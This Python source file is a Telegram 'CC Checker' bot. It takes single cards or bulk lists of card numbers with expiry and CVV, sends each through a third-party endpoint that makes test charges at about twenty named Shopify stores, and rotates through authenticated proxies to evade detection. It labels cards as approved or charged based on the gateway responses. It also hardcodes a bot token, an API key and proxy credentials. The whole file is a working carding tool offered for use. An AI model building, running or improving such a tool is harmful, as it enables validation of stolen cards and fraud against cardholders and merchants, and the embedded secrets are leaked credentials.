import re
import time
import requests
import telebot
from typing import List
import threading
import random
import xml.etree.ElementTree as ET
import os

# ===================== CONFIG =====================
BOT_TOKEN = "8854554558:AAFK6zToPA3qb_TS75E_U9a-G_1RitDcgdA"
MAX_MASS_CHECK = 131
PROXY_FILE = "proxy_list.txt"

DEFAULT_PROXIES = [
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.60.148:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.170.138:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.49.59:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.40.228:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.0.40:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.5.31:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.38.238:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.33.161:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.166.226:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.225.61:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.249.212:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.0.216:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.15.217:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@45.3.62.100:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.252.209:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.40.131:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.59.223:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.185.169:3129",
]

shop_urls = [
    "https://52a07b-2.myshopify.com",
    "https://6sbibg-yh.myshopify.com",
    "https://7pxptt-gn.myshopify.com",
    "https://7zzbrn-ch.myshopify.com",
    "https://a5qrze-bz.myshopify.com",
    "https://ajs-55743.myshopify.com",
    "https://ajvv.myshopify.com",
    "https://ak24pz-na.myshopify.com",
    "https://al-furqans-perfumes-and-beauty.myshopify.com",
    "https://allthingsbykeisha.myshopify.com",
    "https://amneue.myshopify.com",
    "https://animolds.myshopify.com",
    "https://anjoly30-boutique.myshopify.com",
    "https://antarctic-press.myshopify.com",
    "https://apexmarket-store.myshopify.com",
    "https://apkbridal.myshopify.com",
    "https://boldwritst-store.myshopify.com",
    "https://brand-x-electrical.myshopify.com",
    "https://brandalees-bargains.myshopify.com",
    "https://burlap-kitchen.myshopify.com",
]

# ===================== PROXY MANAGEMENT =====================
def load_proxies():
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
            if lines:
                return lines
    return DEFAULT_PROXIES.copy()

def save_proxies(proxies):
    with open(PROXY_FILE, 'w') as f:
        for p in proxies:
            f.write(p + '\n')

def is_valid_proxy_format(proxy_str):
    # user:pass@host:port
    parts = proxy_str.split('@')
    if len(parts) != 2:
        return False
    user_pass, host_port = parts
    if ':' not in user_pass or ':' not in host_port:
        return False
    return True

# Global proxy list (loaded on startup)
proxy_list = load_proxies()

# ===================== BOT SETUP =====================
bot = telebot.TeleBot(BOT_TOKEN)
user_check_in_progress = {}
last_check_time = {}

# ===================== UTILITY FUNCTIONS =====================
def is_valid_card(card: str) -> bool:
    parts = card.split('|')
    if len(parts) != 4:
        return False
    cc, mm, yy, cvv = parts
    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return False
    if not mm.isdigit() or len(mm) != 2:
        return False
    if not yy.isdigit() or len(yy) not in [2, 4]:
        return False
    if not cvv.isdigit() or len(cvv) not in [3, 4]:
        return False
    return True

def esc(t):
    return str(t).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

def bin_lookup(bin_code):
    try:
        url = f"https://api.bincodes.com/bin/?format=xml&api_key=9fc53b3db09ca830488d19546a4fc2a1&bin={bin_code}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            root = ET.fromstring(r.text)
            bin_data = root.find('bin')
            if bin_data is not None:
                return {
                    "brand": bin_data.find('brand').text if bin_data.find('brand') is not None else "N/A",
                    "type": bin_data.find('type').text if bin_data.find('type') is not None else "N/A",
                    "level": bin_data.find('level').text if bin_data.find('level') is not None else "N/A",
                    "bank": bin_data.find('bank').text if bin_data.find('bank') is not None else "N/A",
                    "country": bin_data.find('country').text if bin_data.find('country') is not None else "N/A",
                    "country_emoji": bin_data.find('flag').text if bin_data.find('flag') is not None else "🏳️"
                }
    except Exception:
        pass
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_code}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("brand", "N/A"),
                "type": data.get("type", "N/A"),
                "level": data.get("level", "N/A"),
                "bank": data.get("bank", "N/A"),
                "country": data.get("country_name", "N/A"),
                "country_emoji": data.get("country_flag", "🏳️")
            }
    except:
        pass
    return {
        "brand": "N/A",
        "type": "N/A",
        "level": "N/A",
        "bank": "N/A",
        "country": "N/A",
        "country_emoji": "🏳️"
    }

def format_result(card, api_json, user, user_id, elapsed):
    gateway = api_json.get("Gateway", "Shopify Normal")
    status = api_json.get("Status", api_json.get("status", "Unknown"))
    response_msg = api_json.get("Response", api_json.get("response", ""))
    amount_raw = (
        api_json.get("Amount")
        or api_json.get("amount")
        or api_json.get("price")
        or api_json.get("Price")
    )
    try:
        amount_value = float(str(amount_raw).replace("$", "").strip())
        amount = f"${amount_value:.2f}"
    except:
        amount = "N/A"
    bin_code = card.split('|')[0][:6]
    bininfo = bin_lookup(bin_code)

    status_lower = str(status).lower()
    response_lower = str(response_msg).lower()
    declined_phrases = [
        "declined", "card_declined", "authorization_error", "authentication_failed",
        "do_not_honor", "pick_up_card", "pickup_card", "stolen_card", "lost_card", "incorrect_number",
        "expired_card", "processing_error", "fraudulent", "generic_error",
        "fraud_suspected", "invalid_payment_error", "amount_too_small"
    ]
    if any(x in status_lower or x in response_lower for x in declined_phrases):
        status_str = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "3d", "authentication", "3d secure", "OTP_REQUIRED", "3ds", "otp", "verify", "verification"
    ]):
        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        response_show = response_msg
    elif "insufficient" in response_lower or "low funds" in response_lower:
        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        response_show = response_msg
    elif "incorrect_zip" in response_lower:
        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "incorrect cvc", "invalid cvc", "incorrect cvv", "incorrect_cvc", "INSUFFICIENT_FUNDS", "invalid cvv", "incorrect security code", "invalid security code"
    ]):
        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "thank you", "order placed", "charged", "⤿ORDER_PAID⤾", "successfully paid", "payment successful"
    ]):
        status_str = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 💎"
        response_show = response_msg
    else:
        approved_phrases = ["approved", "charged", "success", "live", "approved!"]
        is_approved = any(p in status_lower for p in approved_phrases)
        status_str = f"{esc(status)} {'✅' if is_approved else '❌'}"
        response_show = response_msg

    link = "https://t.me/NIKSHACKS"
    b = lambda t: f"<b>{t}</b>"
    m = lambda t: f"<code>{t}</code>"
    ks = f'<a href="{link}">ϟ</a>'
    su = f'<a href="{link}">ス</a>'
    curl = f'<a href="{link}">⌯</a>'

    text = (
    f"{b('#Shopi | Luffy [/sh]')}\n"
    f"━━━━━━━━━━━━━\n"
    f"{b(f'[{ks}] Card:')} {m(card)}\n"
    f"{b(f'[{ks}] Gateway:')} {m(f'{gateway} {amount}')}\n"
    f"{b(f'[{ks}] Status:')} {m(esc(status_str))}\n"
    f"{b(f'[{ks}] Response:')} {m(esc(response_show))}\n"
    f"━━━━━━━━━━━━━\n"
    f"{b(f'[{curl}] Bin:')} {m(bin_code)}\n"
    f"{b(f'[{curl}] Info:')} {m(bininfo['brand'] + ' - ' + bininfo['type'] + ' - ' + bininfo['level'])}\n"
    f"{b(f'[{curl}] Bank:')} {m(bininfo['bank'])}\n"
    f"{b(f'[{curl}] Country:')} {m(bininfo['country'] + ' - ' + bininfo['country_emoji'])}\n"
    f"━━━━━━━━━━━━━\n"
    f'{b(f"[{su}] Checked By:")} <a href="tg://user?id={user_id}">{esc(user)}</a>\n'
    f"{b(f'[{su}] Dev:')} <a href=\"tg://user?id=8570832903\">Luffy - ☘️</a>\n"
    f"━━━━━━━━━━━━━\n"
    f"{b(f'[{ks}] T/t:')} {m(f'[{elapsed:.2f}sec] | P/x: [Live 🌥]')}"
)
    return text

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'\b(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b',
        r'\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{4})-(\d{4})-(\d{4})-(\d{4})-(\d{1,2})-(\d{2,4})-(\d{3,4})$',
        r'^(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                cc, mm, yy, cvv = match
                mm = mm.zfill(2)
                if len(yy) == 4: yy = yy[2:]
                card_string = f"{cc}|{mm}|{yy}|{cvv}"
                if card_string not in cards: cards.append(card_string)
    return cards

# ===================== BOT COMMAND HANDLERS =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, 
        "Welcome to the CC Checker Bot!\n\n"
        "Commands:\n"
        "/sh [card] - Check a single card (cc|mm|yy|cvv)\n"
        "/msh - Upload a .txt file for mass check (max 131 cards)\n"
        "/addproxy <proxy> - Add a proxy (user:pass@host:port)\n"
        "/addproxyfile - Upload a .txt file with proxies (one per line)\n"
        "/viewproxy [page] - List proxies (10 per page)\n"
        "/delproxy <index> - Delete a proxy by index\n"
        "/clearproxy - Delete ALL proxies\n"
        "/proxycount - Show total number of proxies"
    )

# ===================== SINGLE CHECK =====================
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('/sh') or m.text.startswith('.sh')))
def check_card(message):
    uid = str(message.from_user.id)

    if user_check_in_progress.get(uid, False):
        bot.reply_to(message, "⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
        return

    now = time.time()
    last_end = last_check_time.get(uid, 0)
    cooldown = 0
    if now - last_end < cooldown:
        wait_sec = int(cooldown - (now - last_end))
        bot.reply_to(message, f"⏳ ᴡʜʏ ꜱᴏ ʜᴜʀʀʏ? ᴡᴀɪᴛ {wait_sec}s…")
        return

    user_check_in_progress[uid] = True

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "❌ ᴜꜱᴀɢᴇ: /ꜱʜ [ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ]")
        user_check_in_progress[uid] = False
        return
    card = args[1].replace(" ", "")
    if not is_valid_card(card):
        bot.reply_to(message, "❌ ɪɴᴠᴀʟɪᴅ ᴄᴀʀᴅ ꜰᴏʀᴍᴀᴛ. ᴜꜱᴇ ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ")
        user_check_in_progress[uid] = False
        return

    status_msg = bot.reply_to(message, "ʏᴏᴜʀ ʀᴇQᴜᴇꜱᴛ ʀᴇᴄᴇɪᴠᴇᴅ!")
    t0 = time.time()
    
    def process_check():
        try:
            shop_url = random.choice(shop_urls)
            proxy = random.choice(proxy_list)
            
            api_url = f"https://nik.cards/shopify?site={shop_url}&cc={card}&proxy={proxy}"
            
            proxies = {"http": proxy, "https": proxy}
            response = requests.get(api_url, timeout=60, proxies=proxies)
            
            try:
                api_json = response.json()
            except Exception:
                api_json = {"Response": response.text}
            
            elapsed = time.time() - t0
            user_display = message.from_user.username or message.from_user.first_name
            result_text = format_result(card, api_json, user=user_display, user_id=message.from_user.id, elapsed=elapsed)
            
            bot.edit_message_text(result_text, chat_id=status_msg.chat.id, message_id=status_msg.message_id, parse_mode='HTML')
            
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=status_msg.chat.id, message_id=status_msg.message_id)
        finally:
            user_check_in_progress[uid] = False
            last_check_time[uid] = time.time()
    
    threading.Thread(target=process_check, daemon=True).start()

# ===================== MASS CHECK =====================
@bot.message_handler(commands=['msh'])
def mass_check(message):
    uid = str(message.from_user.id)

    if user_check_in_progress.get(uid, False):
        bot.reply_to(message, "⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
        return

    if not message.document:
        bot.reply_to(message, "❌ ᴘʟᴇᴀꜱᴇ ᴀᴛᴛᴀᴄʜ ᴀ .ᴛxᴛ ғɪʟᴇ ᴄᴏɴᴛᴀɪɴɪɴɢ ᴄᴀʀᴅꜱ (ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ).")
        return

    file_name = message.document.file_name
    if not file_name.endswith('.txt'):
        bot.reply_to(message, "❌ ғɪʟᴇ ᴍᴜꜱᴛ ʙᴇ ᴀ .ᴛxᴛ ғɪʟᴇ.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path)
        lines = file_content.decode('utf-8').splitlines()
    except Exception as e:
        bot.reply_to(message, f"❌ ᴄᴏᴜʟᴅ ɴᴏᴛ ʀᴇᴀᴅ ғɪʟᴇ: {str(e)}")
        return

    cards = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        extracted = extract_cards_from_text(line)
        if extracted:
            cards.extend(extracted)
        else:
            parts = line.split('|')
            if len(parts) == 4:
                card_str = f"{parts[0]}|{parts[1].zfill(2)}|{parts[2]}|{parts[3]}"
                if is_valid_card(card_str):
                    cards.append(card_str)

    if not cards:
        bot.reply_to(message, "❌ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ғᴏᴜɴᴅ ɪɴ ᴛʜᴇ ғɪʟᴇ.")
        return

    if len(cards) > MAX_MASS_CHECK:
        bot.reply_to(message, f"⚠️ ᴍᴀxɪᴍᴜᴍ {MAX_MASS_CHECK} ᴄᴀʀᴅꜱ ᴀʀᴇ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜʀ ғɪʟᴇ ᴄᴏɴᴛᴀɪɴꜱ {len(cards)} ᴄᴀʀᴅꜱ. ᴏɴʟʏ ᴛʜᴇ ғɪʀꜱᴛ {MAX_MASS_CHECK} ᴡɪʟʟ ʙᴇ ᴄʜᴇᴄᴋᴇᴅ.")
        cards = cards[:MAX_MASS_CHECK]

    user_check_in_progress[uid] = True
    progress_msg = bot.reply_to(message, f"🔄 ᴘʀᴏᴄᴇꜱꜱɪɴɢ {len(cards)} ᴄᴀʀᴅꜱ... ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.")

    def mass_process():
        try:
            total = len(cards)
            for idx, card in enumerate(cards, 1):
                try:
                    shop_url = random.choice(shop_urls)
                    proxy = random.choice(proxy_list)
                    api_url = f"https://nik.cards/shopify?site={shop_url}&cc={card}&proxy={proxy}"
                    proxies = {"http": proxy, "https": proxy}
                    t0 = time.time()
                    response = requests.get(api_url, timeout=60, proxies=proxies)
                    elapsed = time.time() - t0
                    try:
                        api_json = response.json()
                    except Exception:
                        api_json = {"Response": response.text}
                    user_display = message.from_user.username or message.from_user.first_name
                    result_text = format_result(card, api_json, user=user_display, user_id=message.from_user.id, elapsed=elapsed)
                    result_text += f"\n\n[ {idx}/{total} ]"
                    bot.send_message(message.chat.id, result_text, parse_mode='HTML')
                    time.sleep(0.5)
                except Exception as e:
                    bot.send_message(message.chat.id, f"❌ ᴇʀʀᴏʀ ᴄʜᴇᴄᴋɪɴɢ {card}: {str(e)}")
                    time.sleep(0.5)

            bot.edit_message_text(f"✅ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇᴅ! {total} ᴄᴀʀᴅꜱ ᴘʀᴏᴄᴇꜱꜱᴇᴅ.", chat_id=progress_msg.chat.id, message_id=progress_msg.message_id)
        except Exception as e:
            bot.edit_message_text(f"❌ ᴇʀʀᴏʀ ᴅᴜʀɪɴɢ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ: {str(e)}", chat_id=progress_msg.chat.id, message_id=progress_msg.message_id)
        finally:
            user_check_in_progress[uid] = False
            last_check_time[uid] = time.time()

    threading.Thread(target=mass_process, daemon=True).start()

# ===================== PROXY MANAGEMENT HANDLERS =====================
@bot.message_handler(commands=['addproxy'])
def add_proxy(message):
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "❌ ᴜꜱᴀɢᴇ: /ᴀᴅᴅᴘʀᴏxʏ <ᴜꜱᴇʀ:ᴘᴀꜱꜱ@ʜᴏꜱᴛ:ᴘᴏʀᴛ>")
        return
    proxy_str = args[1].strip()
    if not is_valid_proxy_format(proxy_str):
        bot.reply_to(message, "❌ ɪɴᴠᴀʟɪᴅ ᴘʀᴏxʏ ꜰᴏʀᴍᴀᴛ. ᴜꜱᴇ ᴜꜱᴇʀ:ᴘᴀꜱꜱ@ʜᴏꜱᴛ:ᴘᴏʀᴛ")
        return
    if proxy_str in proxy_list:
        bot.reply_to(message, "⚠️ ᴘʀᴏxʏ ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ.")
        return
    proxy_list.append(proxy_str)
    save_proxies(proxy_list)
    bot.reply_to(message, f"✅ ᴘʀᴏxʏ ᴀᴅᴅᴇᴅ. ᴄᴜʀʀᴇɴᴛ ᴄᴏᴜɴᴛ: {len(proxy_list)}")

@bot.message_handler(commands=['addproxyfile'])
def add_proxy_file(message):
    if not message.document:
        bot.reply_to(message, "❌ ᴘʟᴇᴀꜱᴇ ᴀᴛᴛᴀᴄʜ ᴀ .ᴛxᴛ ғɪʟᴇ ᴡɪᴛʜ ᴘʀᴏxɪᴇꜱ (ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ).")
        return
    file_name = message.document.file_name
    if not file_name.endswith('.txt'):
        bot.reply_to(message, "❌ ғɪʟᴇ ᴍᴜꜱᴛ ʙᴇ ᴀ .ᴛxᴛ ғɪʟᴇ.")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path)
        lines = file_content.decode('utf-8').splitlines()
    except Exception as e:
        bot.reply_to(message, f"❌ ᴄᴏᴜʟᴅ ɴᴏᴛ ʀᴇᴀᴅ ғɪʟᴇ: {str(e)}")
        return

    added = 0
    invalid = 0
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if is_valid_proxy_format(line) and line not in proxy_list:
            proxy_list.append(line)
            added += 1
        else:
            invalid += 1

    if added:
        save_proxies(proxy_list)
        bot.reply_to(message, f"✅ ᴀᴅᴅᴇᴅ {added} ᴘʀᴏxɪᴇꜱ. ꜱᴋɪᴘᴘᴇᴅ {invalid} ɪɴᴠᴀʟɪᴅ ᴏʀ ᴅᴜᴘʟɪᴄᴀᴛᴇ. ᴄᴜʀʀᴇɴᴛ ᴄᴏᴜɴᴛ: {len(proxy_list)}")
    else:
        bot.reply_to(message, f"❌ ɴᴏ ᴠᴀʟɪᴅ ᴘʀᴏxɪᴇꜱ ꜰᴏᴜɴᴅ ɪɴ ᴛʜᴇ ғɪʟᴇ.")

@bot.message_handler(commands=['viewproxy'])
def view_proxy(message):
    if not proxy_list:
        bot.reply_to(message, "ℹ️ ɴᴏ ᴘʀᴏxɪᴇꜱ ɪɴ ᴛʜᴇ ʟɪꜱᴛ.")
        return
    args = message.text.split()
    page = 1
    if len(args) > 1 and args[1].isdigit():
        page = int(args[1])
    per_page = 10
    total = len(proxy_list)
    total_pages = (total + per_page - 1) // per_page
    if page < 1:
        page = 1
    if page > total_pages:
        page = total_pages
    start = (page - 1) * per_page
    end = min(start + per_page, total)
    text = f"📋 ᴘʀᴏxʏ ʟɪꜱᴛ (ᴘᴀɢᴇ {page}/{total_pages}):\n"
    for i, proxy in enumerate(proxy_list[start:end], start=start+1):
        text += f"{i}. `{proxy}`\n"
    text += f"\nᴛᴏᴛᴀʟ: {total} ᴘʀᴏxɪᴇꜱ"
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['delproxy'])
def del_proxy(message):
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        bot.reply_to(message, "❌ ᴜꜱᴀɢᴇ: /ᴅᴇʟᴘʀᴏxʏ <ɪɴᴅᴇx>")
        return
    idx = int(args[1])
    if idx < 1 or idx > len(proxy_list):
        bot.reply_to(message, f"❌ ɪɴᴅᴇx ᴏᴜᴛ ᴏꜰ ʀᴀɴɢᴇ (1-{len(proxy_list)})")
        return
    removed = proxy_list.pop(idx - 1)
    save_proxies(proxy_list)
    bot.reply_to(message, f"✅ ᴅᴇʟᴇᴛᴇᴅ ᴘʀᴏxʏ #{idx}: `{removed}`", parse_mode='Markdown')

@bot.message_handler(commands=['clearproxy'])
def clear_proxy(message):
    # Confirm with a reply keyboard? For simplicity, just clear.
    proxy_list.clear()
    save_proxies(proxy_list)
    bot.reply_to(message, "🗑️ ᴀʟʟ ᴘʀᴏxɪᴇꜱ ʜᴀᴠᴇ ʙᴇᴇɴ ᴄʟᴇᴀʀᴇᴅ.")

@bot.message_handler(commands=['proxycount'])
def proxy_count(message):
    bot.reply_to(message, f"📊 ᴛᴏᴛᴀʟ ᴘʀᴏxɪᴇꜱ: {len(proxy_list)}")

# ===================== BOT POLLING =====================
if __name__ == "__main__":
    print("Bot started...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
